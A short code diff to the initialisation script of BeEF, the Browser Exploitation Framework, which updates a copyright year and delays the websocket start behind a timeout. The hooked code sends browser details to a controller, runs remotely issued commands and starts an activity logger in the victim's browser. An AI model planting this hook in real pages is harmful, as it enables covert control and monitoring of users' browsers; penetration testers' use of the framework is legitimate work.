@@ -1,5 +1,5 @@
 //
-// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
+// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
 // Browser Exploitation Framework (BeEF) - http://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
@@ -64,11 +64,14 @@ window.onclose = function (event) {
 function beef_init() {
     if (!beef.pageIsLoaded) {
         beef.pageIsLoaded = true;
+        beef.net.browser_details();
+
         if (beef.browser.hasWebSocket() && typeof beef.websocket != 'undefined') {
-            beef.websocket.start();
-            beef.net.browser_details();
-            beef.updater.execute_commands();
-            beef.logger.start();
+            setTimeout(function(){
+                beef.websocket.start();
+                beef.updater.execute_commands();
+                beef.logger.start();
+            }, parseInt(beef.websocket.ws_connect_timeout));
         }else {
             beef.net.browser_details();
             beef.updater.execute_commands();
